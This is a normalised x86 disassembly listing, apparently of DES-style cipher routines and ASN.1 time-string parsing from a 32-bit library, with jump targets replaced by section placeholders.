jmp r-xdata
mov edx ecx
dec esi
shr edx 0x18
mov [ esi ] dl
mov edx ecx
dec esi
shr edx 0x10
mov [ esi ] dl
mov edx ecx
dec esi
shr edx 0x8
mov [ esi ] dl
dec esi
mov [ esi ] cl
mov edx eax
dec esi
shr edx 0x18
mov [ esi ] dl
mov edx eax
dec esi
shr edx 0x10
mov [ esi ] dl
mov edx eax
dec esi
shr edx 0x8
mov [ esi ] dl
dec esi
mov [ esi ] al
mov eax 0x0
setne al
add eax 0x8
push eax
mov eax esi
cdq
and edx 0x7
add eax edx
lea edx [ esp + 0x28 ]
sar eax 0x3
lea ecx [ esp + eax + 0x28 ]
push ecx
push edx
call memmove
add esp 0xc
test ebx ebx
je r-xdata
dec ebx
or ebx 0xfffffff8
inc ebx
mov eax [ esp + 0x10 ]
add esi edi
cmp eax edi
mov eax [ esp + 0x44 ]
mov [ esp + 0x3c ] esi
jae r-xdata
jmp [ edx * 4 + jump_table_10047738 ]
mov edx ebx
mov [ esp + 0x24 ] bl
shr edx 0x8
mov [ esp + 0x25 ] dl
mov edx ebx
shr edx 0x10
mov [ esp + 0x26 ] dl
mov edx [ esp + 0x44 ]
shr ebx 0x18
mov [ esp + 0x27 ] bl
mov ebx edx
shr ebx 0x8
mov [ esp + 0x29 ] bl
mov [ esp + 0x28 ] dl
mov ebx edx
mov [ esp + 0x2c ] al
shr edx 0x18
mov [ esp + 0x2b ] dl
mov edx eax
shr edx 0x8
mov [ esp + 0x2d ] dl
mov edx eax
shr edx 0x10
shr eax 0x18
shr ebx 0x10
mov [ esp + 0x2e ] dl
mov [ esp + 0x2f ] al
mov [ esp + 0x2a ] bl
mov eax ecx
mov edx ecx
mov [ esp + 0x30 ] cl
mov ebx esi
shr eax 0x8
shr edx 0x10
shr ecx 0x18
and ebx 0x80000007
mov [ esp + 0x31 ] al
mov [ esp + 0x32 ] dl
mov [ esp + 0x33 ] cl
jns r-xdata
mov ebx eax
mov [ esp + 0x44 ] ecx
jmp r-xdata
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x25 ]
mov ebx [ esp + 0x24 ]
mov ecx [ esp + 0x26 ]
mov edx [ esp + 0x27 ]
and eax 0xff
and ebx 0xff
shl eax 0x8
and ecx 0xff
or ebx eax
mov eax [ esp + 0x28 ]
and edx 0xff
shl ecx 0x10
or ebx ecx
mov ecx [ esp + 0x29 ]
shl edx 0x18
and ecx 0xff
or ebx edx
mov edx [ esp + 0x2b ]
and eax 0xff
shl ecx 0x8
or eax ecx
mov ecx [ esp + 0x2a ]
and edx 0xff
and ecx 0xff
shl edx 0x8
or edx ecx
mov ecx [ esp + 0x14 ]
shl edx 0x10
or eax edx
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x58 ]
mov edx 0x8
xor esi esi
sub edx ebx
mov [ esp + 0x44 ] edx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x50 ]
sub ecx edi
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x4c ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x48 ]
push edx
push eax
lea edx [ esp + 0x24 ]
push ecx
push edx
mov [ esp + 0x2c ] ebx
call sub_10046240
lea edx [ edi - 0x1 ]
add esp 0x10
add ebp edi
xor ecx ecx
xor eax eax
cmp edx 0x7
mov [ esp + 0x14 ] ecx
mov [ esp + 0x58 ] eax
ja r-xdata
mov edx ecx
dec esi
shr edx 0x18
mov [ esi ] dl
mov edx ecx
dec esi
shr edx 0x10
mov [ esi ] dl
mov edx ecx
dec esi
shr edx 0x8
mov [ esi ] dl
dec esi
mov [ esi ] cl
mov ecx eax
dec esi
shr ecx 0x18
mov [ esi ] cl
mov edx eax
dec esi
shr edx 0x10
mov [ esi ] dl
mov ecx eax
dec esi
shr ecx 0x8
mov [ esi ] cl
dec esi
mov [ esi ] al
mov eax 0x0
setne al
add eax 0x8
push eax
mov eax esi
cdq
and edx 0x7
add eax edx
lea edx [ esp + 0x28 ]
sar eax 0x3
lea ecx [ esp + eax + 0x28 ]
push ecx
push edx
call memmove
add esp 0xc
test ebx ebx
je r-xdata
dec ebx
or ebx 0xfffffff8
inc ebx
mov eax [ esp + 0x10 ]
cmp eax edi
mov eax [ esp + 0x44 ]
jae r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x4c ]
sub edx edi
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x50 ]
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x48 ]
push eax
push ecx
lea eax [ esp + 0x24 ]
push edx
push eax
mov [ esp + 0x2c ] ebx
call sub_10046240
lea edx [ edi - 0x1 ]
add esp 0x10
add ebp edi
xor ecx ecx
xor eax eax
cmp edx 0x7
ja r-xdata
jmp r-xdata
mov al [ esp + esi + 0x24 ]
mov cl bl
shl al cl
mov [ esp + esi + 0x24 ] al
mov cl [ esp + esi + 0x25 ]
mov [ esp + 0x38 ] cl
mov cl dl
mov dl [ esp + 0x38 ]
shr dl cl
or dl al
mov [ esp + esi + 0x24 ] dl
inc esi
cmp esi 0x8
jl r-xdata
mov eax [ esp + 0x25 ]
mov ebx [ esp + 0x24 ]
mov ecx [ esp + 0x26 ]
mov edx [ esp + 0x27 ]
and eax 0xff
and ebx 0xff
shl eax 0x8
and ecx 0xff
or ebx eax
mov eax [ esp + 0x28 ]
and edx 0xff
shl ecx 0x10
or ebx ecx
mov ecx [ esp + 0x29 ]
shl edx 0x18
and ecx 0xff
or ebx edx
mov edx [ esp + 0x2b ]
and eax 0xff
shl ecx 0x8
or eax ecx
mov ecx [ esp + 0x2a ]
and edx 0xff
and ecx 0xff
shl edx 0x8
or edx ecx
shl edx 0x10
or eax edx
mov edx 0x8
xor esi esi
sub edx ebx
mov [ esp + 0x44 ] edx
jmp r-xdata
mov edx [ esp + 0x44 ]
mov al [ esp + esi + 0x24 ]
mov cl bl
shl al cl
mov [ esp + esi + 0x24 ] al
mov cl [ esp + esi + 0x25 ]
mov [ esp + 0x38 ] cl
mov cl dl
mov dl [ esp + 0x38 ]
shr dl cl
or dl al
mov [ esp + esi + 0x24 ] dl
inc esi
cmp esi 0x8
jl r-xdata
mov edx [ esp + 0x44 ]
sub_10047780
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
xor eax eax
xor ecx ecx
mov al [ esi ]
mov ch [ esi + 0x1 ]
inc esi
or eax ecx
inc esi
xor edx edx
xor ecx ecx
mov ebp [ esp + 0x14 ]
mov dl [ esi ]
mov cl [ esi + 0x1 ]
shl edx 0x10
or eax edx
inc esi
shl ecx 0x18
or eax ecx
inc esi
xor ecx ecx
xor edx edx
mov cl [ esi ]
mov dh [ esi + 0x1 ]
inc esi
or ecx edx
inc esi
xor edx edx
push edi
mov dh [ esi + 0x1 ]
mov dl [ esi ]
mov esi eax
shl edx 0x10
or ecx edx
and esi 0xf0f0f0f
mov edx ecx
shr edx 0x4
and edx 0xf0f0f0f
xor edx esi
xor eax edx
shl edx 0x4
xor ecx edx
mov edx eax
and edx 0xfffff333
mov esi eax
shl edx 0x12
and esi 0xcccc0000
xor edx esi
mov esi edx
shr esi 0x12
xor esi edx
mov edx ecx
xor eax esi
and edx 0xfffff333
mov esi ecx
shl edx 0x12
and esi 0xcccc0000
xor edx esi
mov esi edx
shr esi 0x12
xor esi edx
xor ecx esi
mov esi eax
mov edx ecx
and esi 0x55555555
shr edx 0x1
and edx 0x55555555
xor edx esi
xor eax edx
add edx edx
xor ecx edx
mov edx eax
shr edx 0x8
mov esi ecx
and edx 0xff00ff
and esi 0xff00ff
xor edx esi
xor ecx edx
shl edx 0x8
xor eax edx
mov edx ecx
shr edx 0x1
mov esi eax
and edx 0x55555555
and esi 0x55555555
xor edx esi
xor eax edx
add edx edx
xor ecx edx
mov edx eax
mov esi ecx
and edx 0xf000000f
shr esi 0xc
and esi 0xff0
or esi edx
mov edx ecx
and edx 0xff
and ecx 0xff00
shr esi 0x4
shl edx 0x10
or esi edx
or esi ecx
mov ecx rw-data
and eax 0xfffffff
mov [ esp + 0x18 ] ecx
shl ecx 0x1b
shr eax 0x1
mov edx esi
or eax ecx
shl edx 0x1b
shr esi 0x1
shl ecx 0x1a
shr eax 0x2
mov edx esi
or eax ecx
shl edx 0x1a
shr esi 0x2
jmp r-xdata
mov edx [ ecx ]
mov ecx eax
test edx edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
and eax 0xfffffff
or esi edx
mov edx eax
mov edi eax
shr edx 0x1
mov ecx edx
and edi 0xc00000
and ecx 0x7000000
mov ebx edx
or ecx edi
mov edi eax
shr ecx 0x1
and edi 0x100000
and ebx 0x60000
or ecx edi
mov edi eax
and edi 0x1e000
and edx 0xf00
or edi ebx
and esi 0xfffffff
shr edi 0xd
shr ecx 0x14
mov ebx [ edi * 4 + r--data ]
mov edi eax
mov ecx [ ecx * 4 + r--data ]
and edi 0xc0
or edx edi
or ecx ebx
shr edx 0x6
mov ebx esi
add ebp 0x4
mov edi [ edx * 4 + r--data ]
mov edx eax
and edx 0x3f
or ecx edi
and ebx 0x180
add ebp 0x4
mov edi [ edx * 4 + r--data ]
or ecx edi
mov edi esi
shr edi 0x1
mov edx edi
and edi 0x6000000
and edx 0x1e00
or edx ebx
mov ebx esi
and ebx 0x1e00000
or edi ebx
shr edi 0x15
shr edx 0x7
mov ebx [ edi * 4 + r--data ]
mov edi esi
mov edx [ edx * 4 + r--data ]
shr edi 0xf
and edi 0x3f
or edx ebx
mov ebx [ edi * 4 + r--data ]
mov edi esi
and edi 0x3f
or edx ebx
mov ebx [ edi * 4 + r--data ]
mov edi ecx
or edx ebx
and edi 0xffff
mov ebx edx
and edx 0xffff0000
shl ebx 0x10
or edi ebx
ror edi 0x1e
shr ecx 0x10
mov [ ebp - 0x8 ] edi
or ecx edx
ror ecx 0x1a
mov [ ebp - 0x4 ] ecx
mov ecx [ esp + 0x18 ]
add ecx 0x4
cmp ecx rw-data
mov [ esp + 0x18 ] ecx
jl r-xdata
sub_10047a00
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0xc ]
xor ecx ecx
xor edx edx
mov cl [ eax ]
mov dh [ eax + 0x1 ]
inc eax
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x18
or ecx edx
inc eax
mov [ esp ] ecx
xor ecx ecx
mov cl [ eax ]
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dh [ eax + 0x1 ]
mov dl [ eax ]
mov eax [ esp + 0x18 ]
shl edx 0x10
or edx ecx
mov ecx [ esp + 0x14 ]
mov [ esp + 0x4 ] edx
push eax
lea edx [ esp + 0x4 ]
push ecx
push edx
call sub_10045820
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0xc ]
mov edx ecx
mov [ eax ] cl
inc eax
shr edx 0x8
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
inc eax
shr ecx 0x18
mov [ eax ] cl
mov ecx [ esp + 0x10 ]
inc eax
mov edx ecx
shr edx 0x8
mov [ eax ] cl
inc eax
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
shr ecx 0x18
mov [ eax ] dl
mov [ eax + 0x1 ] cl
add esp 0x14
retn
sub_10047ab0
mov eax 0x18
call sub_1001d0d0
mov eax [ esp + 0x30 ]
push ebx
push ebp
mov ebp [ esp + 0x34 ]
push esi
push edi
mov edi [ eax ]
lea esi [ ebp + 0x1 ]
xor eax eax
xor ecx ecx
mov al [ ebp ]
mov ch [ esi ]
mov [ esp + 0x14 ] esi
or eax ecx
inc esi
xor edx edx
xor ecx ecx
mov [ esp + 0x10 ] 0x0
mov dl [ esi ]
mov cl [ esi + 0x1 ]
shl edx 0x10
or eax edx
inc esi
shl ecx 0x18
or eax ecx
inc esi
xor ecx ecx
xor edx edx
mov cl [ esi ]
mov dh [ esi + 0x1 ]
inc esi
or ecx edx
inc esi
xor edx edx
mov ebx eax
mov [ esp + 0x18 ] al
mov dh [ esi + 0x1 ]
mov dl [ esi ]
shl edx 0x10
shr ebx 0x8
or ecx edx
mov [ esp + 0x19 ] bl
mov edx eax
mov ebx eax
shr eax 0x18
mov [ esp + 0x1b ] al
mov eax ecx
shr eax 0x8
mov [ esp + 0x1d ] al
mov eax ecx
shr eax 0x10
mov [ esp + 0x1e ] al
mov eax [ esp + 0x34 ]
mov [ esp + 0x24 ] ecx
mov [ esp + 0x1c ] cl
shr ebx 0x10
shr ecx 0x18
test eax eax
mov [ esp + 0x20 ] edx
mov [ esp + 0x1a ] bl
mov [ esp + 0x1f ] cl
je r-xdata
mov edx [ esp + 0x40 ]
mov [ edx ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov esi [ esp + 0x30 ]
mov ebx [ esp + 0x2c ]
mov ecx [ esp + 0x24 ]
mov [ esp + 0x3c ] eax
mov al [ esp + edi + 0x18 ]
xor al [ ebx ]
inc esi
inc ebx
inc edi
mov [ esi - 0x1 ] al
mov eax [ esp + 0x3c ]
and edi 0x7
dec eax
mov [ esp + 0x3c ] eax
jne r-xdata
mov ecx [ esp + 0x38 ]
push 0x1
lea edx [ esp + 0x24 ]
push ecx
push edx
call sub_10045820
mov edx [ esp + 0x2c ]
add esp 0xc
mov eax edx
mov ecx edx
shr eax 0x8
mov [ esp + 0x19 ] al
mov eax edx
shr ecx 0x10
mov [ esp + 0x1a ] cl
mov ecx [ esp + 0x24 ]
shr eax 0x18
mov [ esp + 0x1b ] al
mov eax ecx
shr eax 0x8
mov [ esp + 0x1d ] al
mov eax ecx
shr eax 0x10
mov [ esp + 0x1e ] al
mov eax ecx
shr eax 0x18
mov [ esp + 0x1f ] al
mov eax [ esp + 0x10 ]
inc eax
mov [ esp + 0x18 ] dl
mov [ esp + 0x1c ] cl
mov [ esp + 0x10 ] eax
test edi edi
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
mov [ ecx ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov eax [ esp + 0x14 ]
mov ebx edx
shr ebx 0x8
mov [ ebp ] dl
mov [ eax ] bl
mov ebx edx
inc eax
shr ebx 0x10
mov [ eax ] bl
inc eax
shr edx 0x18
mov [ eax ] dl
inc eax
mov edx ecx
mov [ eax ] cl
inc eax
shr edx 0x8
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
shr ecx 0x18
mov [ eax ] dl
mov [ eax + 0x1 ] cl
mov eax [ esp + 0x40 ]
mov [ eax ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
sub_10047c60
mov eax 0x8
call sub_1001d0d0
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x24 ]
push ebx
push ebp
push esi
mov esi [ edx ]
test eax eax
mov eax [ esp + 0x20 ]
push edi
je r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov edi [ esp + 0x2c ]
mov ebx [ esp + 0x1c ]
mov [ esp + 0x24 ] eax
mov edi [ esp + 0x2c ]
mov ebx [ esp + 0x1c ]
mov [ esp + 0x24 ] eax
mov al [ ebx ]
mov cl [ esi + edi ]
mov [ esi + edi ] al
xor al cl
mov ecx [ esp + 0x20 ]
inc ebx
mov [ ecx ] al
mov eax [ esp + 0x24 ]
inc ecx
inc esi
and esi 0x7
dec eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] eax
jne r-xdata
lea ebp [ edi + 0x1 ]
xor ecx ecx
mov cl [ edi ]
mov eax ebp
xor edx edx
push 0x1
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x18
or ecx edx
inc eax
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov cl [ eax ]
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dh [ eax + 0x1 ]
mov dl [ eax ]
mov eax [ esp + 0x2c ]
shl edx 0x10
or edx ecx
lea ecx [ esp + 0x14 ]
push eax
push ecx
mov [ esp + 0x20 ] edx
call sub_10045820
mov ecx [ esp + 0x1c ]
mov eax ebp
mov edx ecx
mov [ edi ] cl
shr edx 0x8
mov [ eax ] dl
add esp 0xc
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
inc eax
shr ecx 0x18
mov [ eax ] cl
mov ecx [ esp + 0x14 ]
inc eax
mov edx ecx
shr edx 0x8
mov [ eax ] cl
inc eax
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
shr ecx 0x18
mov [ eax ] dl
mov edx [ esp + 0x30 ]
mov [ eax + 0x1 ] cl
mov al [ ebx ]
mov cl [ esi + edi ]
xor al cl
mov ecx [ esp + 0x20 ]
inc ebx
mov [ ecx ] al
inc ecx
mov [ esi + edi ] al
mov eax [ esp + 0x24 ]
inc esi
mov [ esp + 0x20 ] ecx
and esi 0x7
dec eax
mov [ esp + 0x24 ] eax
jne r-xdata
lea ebp [ edi + 0x1 ]
xor ecx ecx
mov cl [ edi ]
mov eax ebp
xor edx edx
push 0x1
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x18
or ecx edx
inc eax
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov cl [ eax ]
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dh [ eax + 0x1 ]
mov dl [ eax ]
mov eax [ esp + 0x2c ]
shl edx 0x10
or edx ecx
lea ecx [ esp + 0x14 ]
push eax
push ecx
mov [ esp + 0x20 ] edx
call sub_10045820
mov ecx [ esp + 0x1c ]
mov eax ebp
mov edx ecx
mov [ edi ] cl
shr edx 0x8
mov [ eax ] dl
add esp 0xc
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
inc eax
shr ecx 0x18
mov [ eax ] cl
mov ecx [ esp + 0x14 ]
inc eax
mov edx ecx
shr edx 0x8
mov [ eax ] cl
inc eax
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
shr ecx 0x18
mov [ eax ] dl
mov edx [ esp + 0x30 ]
mov [ eax + 0x1 ] cl
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
sub_10047e50
mov eax 0x2c
call sub_1001d0d0
mov ecx [ esp + 0x38 ]
push ebp
mov eax ecx
push esi
cdq
and edx 0x7
mov esi [ esp + 0x44 ]
add eax edx
mov [ esp + 0xc ] esi
sar eax 0x3
mov [ esp + 0x10 ] eax
lea eax [ ecx + 0x7 ]
cdq
and edx 0x7
add eax edx
mov ebp eax
mov eax ecx
sar ebp 0x3
and eax 0x80000007
jns r-xdata
test ecx ecx
mov [ esp + 0x14 ] eax
jle r-xdata
dec eax
or eax 0xfffffff8
inc eax
pop esi
pop ebp
add esp 0x2c
retn
cmp ecx 0x40
jg r-xdata
mov eax [ esp + 0x4c ]
push ebx
xor ebx ebx
xor ecx ecx
mov bl [ eax ]
mov ch [ eax + 0x1 ]
inc eax
or ebx ecx
mov [ esp + 0x1c ] eax
inc eax
xor edx edx
xor ecx ecx
mov dl [ eax ]
mov cl [ eax + 0x1 ]
shl edx 0x10
or ebx edx
inc eax
shl ecx 0x18
or ebx ecx
inc eax
xor ecx ecx
xor edx edx
mov cl [ eax ]
mov dh [ eax + 0x1 ]
inc eax
or ecx edx
inc eax
xor edx edx
push edi
mov [ esp + 0x10 ] ebx
mov dh [ eax + 0x1 ]
mov dl [ eax ]
mov eax [ esp + 0x58 ]
shl edx 0x10
or ecx edx
test eax eax
mov [ esp + 0x4c ] ecx
je r-xdata
cmp esi ebp
jb r-xdata
cmp esi ebp
jb r-xdata
mov edx [ esp + 0x54 ]
mov esi [ esp + 0x20 ]
mov eax ebx
pop edi
shr eax 0x8
mov [ edx ] bl
mov [ esi ] al
mov edx ebx
inc esi
shr edx 0x10
mov [ esi ] dl
inc esi
shr ebx 0x18
mov [ esi ] bl
inc esi
mov eax ecx
mov edx ecx
mov [ esi ] cl
inc esi
shr eax 0x8
mov [ esi ] al
inc esi
shr edx 0x10
shr ecx 0x18
mov [ esi ] dl
mov [ esi + 0x1 ] cl
pop ebx
lea edi [ ebp - 0x1 ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x28 ] ecx
sub eax ebp
push 0x1
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x54 ]
lea ecx [ esp + 0x28 ]
push eax
push ecx
mov [ esp + 0x30 ] ebx
call sub_10045820
mov esi [ esp + 0x4c ]
lea edi [ ebp - 0x1 ]
add esp 0xc
add esi ebp
xor ecx ecx
xor eax eax
cmp edi 0x7
ja r-xdata
mov ecx [ esp + 0x48 ]
add esi ebp
cmp ecx 0x20
mov [ esp + 0x40 ] esi
jne r-xdata
jmp [ edi * 4 + jump_table_100482d8 ]
mov edx [ esp + 0x24 ]
add esi ebp
mov [ esp + 0x40 ] esi
mov esi [ esp + 0x28 ]
xor ecx esi
mov esi [ esp + 0x44 ]
xor eax edx
add esi ebp
cmp edi 0x7
ja r-xdata
jmp [ edi * 4 + jump_table_10048298 ]
cmp ecx 0x40
jne r-xdata
mov ecx [ esp + 0x4c ]
mov [ esp + 0x4c ] ebx
mov [ esp + 0x10 ] ecx
jmp r-xdata
dec esi
xor eax eax
mov al [ esi ]
shl eax 0x18
mov [ esp + 0x58 ] eax
dec esi
xor ecx ecx
mov cl [ esi ]
shl ecx 0x10
or eax ecx
dec esi
xor edx edx
mov dh [ esi ]
or eax edx
dec esi
xor ecx ecx
mov cl [ esi ]
or eax ecx
mov [ esp + 0x58 ] eax
dec esi
xor ebx ebx
mov bl [ esi ]
shl ebx 0x18
dec esi
xor edx edx
mov dl [ esi ]
shl edx 0x10
or ebx edx
dec esi
xor ecx ecx
mov ch [ esi ]
or ebx ecx
dec esi
xor edx edx
mov dl [ esi ]
or ebx edx
mov edx [ esp + 0x48 ]
add esi ebp
cmp edx 0x20
mov [ esp + 0x44 ] esi
jne r-xdata
jmp [ edi * 4 + jump_table_100482b8 ]
dec esi
xor ecx ecx
mov cl [ esi ]
shl ecx 0x18
dec esi
xor edx edx
mov dl [ esi ]
shl edx 0x10
or ecx edx
dec esi
xor eax eax
mov ah [ esi ]
or ecx eax
dec esi
xor edx edx
mov dl [ esi ]
or ecx edx
dec esi
xor eax eax
mov al [ esi ]
shl eax 0x18
dec esi
xor edx edx
mov dl [ esi ]
shl edx 0x10
or eax edx
dec esi
xor edx edx
mov dh [ esi ]
or eax edx
dec esi
xor edx edx
mov dl [ esi ]
or eax edx
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x10 ]
mov [ esp + 0x30 ] ecx
mov ecx [ esp + 0x1c ]
test ecx ecx
mov [ esp + 0x2c ] edx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] eax
jne r-xdata
mov [ esp + 0x10 ] ebx
mov [ esp + 0x4c ] eax
jmp r-xdata
mov esi [ esp + 0x28 ]
mov edi [ esp + 0x24 ]
xor eax esi
mov esi [ esp + 0x44 ]
xor ebx edi
lea edi [ ebp - 0x1 ]
add esi ebp
cmp edi 0x7
ja r-xdata
cmp edx 0x40
jne r-xdata
mov ecx [ esp + 0x4c ]
mov [ esp + 0x4c ] eax
mov [ esp + 0x10 ] ecx
jmp r-xdata
mov edx ecx
dec esi
shr edx 0x18
mov [ esi ] dl
mov edx ecx
dec esi
shr edx 0x10
mov [ esi ] dl
mov edx ecx
dec esi
shr edx 0x8
mov [ esi ] dl
dec esi
mov [ esi ] cl
mov edx eax
dec esi
shr edx 0x18
mov [ esi ] dl
mov edx eax
dec esi
shr edx 0x10
mov [ esi ] dl
mov edx eax
dec esi
shr edx 0x8
mov [ esi ] dl
dec esi
mov [ esi ] al
mov edx [ esp + 0x18 ]
mov eax 0x8
xor esi esi
sub eax ecx
mov [ esp + 0x10 ] eax
lea edi [ esp + edx + 0x2c ]
jmp r-xdata
mov edx [ esp + 0x18 ]
push 0x8
lea ecx [ esp + 0x30 ]
lea eax [ esp + edx + 0x30 ]
push eax
push ecx
call memmove
add esp 0xc
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ebx [ esp + 0x10 ]
mov ecx [ esp + 0x4c ]
add esi ebp
cmp eax ebp
mov [ esp + 0x44 ] esi
jae r-xdata
jmp [ edi * 4 + jump_table_100482f8 ]
mov edx [ esp + 0x4c ]
mov [ esp + 0x38 ] ecx
mov ecx [ esp + 0x1c ]
mov [ esp + 0x2c ] ebx
test ecx ecx
mov [ esp + 0x30 ] edx
mov [ esp + 0x34 ] eax
jne r-xdata
mov [ esp + 0x10 ] eax
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ebx [ esp + 0x10 ]
mov ecx [ esp + 0x4c ]
cmp eax ebp
jae r-xdata
mov dl [ edi + esi ]
mov ecx [ esp + 0x1c ]
shl dl cl
mov cl al
mov al dl
mov dl [ edi + esi + 0x1 ]
shr dl cl
or al dl
mov [ esp + esi + 0x2c ] al
inc esi
cmp esi 0x8
jl r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x58 ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0x4c ] edx
mov edx [ esp + 0x14 ]
push 0x1
sub edx ebp
lea eax [ esp + 0x28 ]
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x54 ]
push edx
push eax
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ecx
call sub_10045820
mov esi [ esp + 0x4c ]
add esp 0xc
add esi ebp
xor eax eax
xor ebx ebx
cmp edi 0x7
mov [ esp + 0x58 ] eax
ja r-xdata
mov ecx eax
dec esi
shr ecx 0x18
mov [ esi ] cl
mov edx eax
dec esi
shr edx 0x10
mov [ esi ] dl
mov ecx eax
dec esi
shr ecx 0x8
mov [ esi ] cl
dec esi
mov [ esi ] al
mov edx ebx
dec esi
shr edx 0x18
mov [ esi ] dl
mov eax ebx
dec esi
shr eax 0x10
mov [ esi ] al
mov ecx ebx
dec esi
shr ecx 0x8
mov [ esi ] cl
dec esi
mov [ esi ] bl
mov eax 0x8
xor esi esi
sub eax ecx
mov ecx [ esp + 0x18 ]
lea edi [ esp + ecx + 0x2c ]
mov eax [ esp + 0x18 ]
push 0x8
lea edx [ esp + 0x30 ]
lea ecx [ esp + eax + 0x30 ]
push ecx
push edx
call memmove
add esp 0xc
jmp r-xdata
mov [ esp + 0x4c ] ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov dl [ edi + esi ]
mov ecx [ esp + 0x1c ]
mov bl [ edi + esi + 0x1 ]
shl dl cl
mov cl al
shr bl cl
or dl bl
mov [ esp + esi + 0x2c ] dl
inc esi
cmp esi 0x8
jl r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x30 ]
mov [ esp + 0x10 ] eax
sub_10048330
mov eax 0x24
call sub_1001d0d0
lea eax [ esp ]
lea ecx [ esp + 0x2c ]
push eax
push ecx
call sub_10058d60
add esp 0x8
test eax eax
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x32
jl r-xdata
push 0x6d
push r--data
push 0xad
push 0xaf
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
add esp 0x24
retn
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
push ecx
push edx
call sub_10048540
add esp 0x8
add esp 0x24
retn
cmp eax 0x96
jge r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x28 ]
push edx
push eax
call sub_10048760
add esp 0x8
add esp 0x24
retn
sub_100483b0
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp eax 0x18
jne r-xdata
cmp eax 0x17
jne r-xdata
push ecx
call sub_100483e0
add esp 0x4
retn
xor eax eax
retn
push ecx
call sub_10048640
add esp 0x4
retn
sub_100483e0
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
cmp [ eax + 0x4 ] 0x18
je r-xdata
mov ebx [ eax ]
mov edi [ eax + 0x8 ]
xor eax eax
cmp ebx 0xd
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
xor esi esi
mov cl [ eax + edi ]
cmp cl 0x30
jl r-xdata
mov cl [ eax + edi ]
cmp cl 0x5a
je r-xdata
cmp cl 0x39
jg r-xdata
cmp [ eax + edi ] 0x2e
jne r-xdata
cmp cl 0x2b
je r-xdata
movsx ecx cl
sub ecx 0x30
inc eax
cmp eax ebx
jg r-xdata
mov cl [ eax + edi ]
cmp cl 0x5a
jne r-xdata
inc eax
cmp eax ebx
jg r-xdata
cmp cl 0x2d
je r-xdata
mov dl [ eax + edi ]
cmp dl 0x30
jl r-xdata
cmp cl 0x2b
je r-xdata
inc eax
xor ecx ecx
cmp eax ebx
pop edi
sete cl
pop esi
mov eax ecx
pop ebx
retn
mov cl [ eax + edi ]
mov edx eax
cmp cl 0x30
jl r-xdata
cmp dl 0x39
jg r-xdata
inc eax
lea ecx [ eax + 0x4 ]
cmp ecx ebx
jg r-xdata
cmp cl 0x2d
jne r-xdata
cmp cl 0x39
jg r-xdata
movsx edx dl
lea ecx [ ecx + ecx * 4 ]
inc eax
cmp eax ebx
lea ecx [ edx + ecx * 2 - 0x30 ]
jg r-xdata
xor esi esi
xor ecx ecx
cmp eax ebx
sete cl
pop edi
pop esi
mov eax ecx
pop ebx
retn
cmp edx eax
je r-xdata
cmp eax ebx
jg r-xdata
cmp ecx [ esi * 4 + rw-data ]
jl r-xdata
cmp cl 0x39
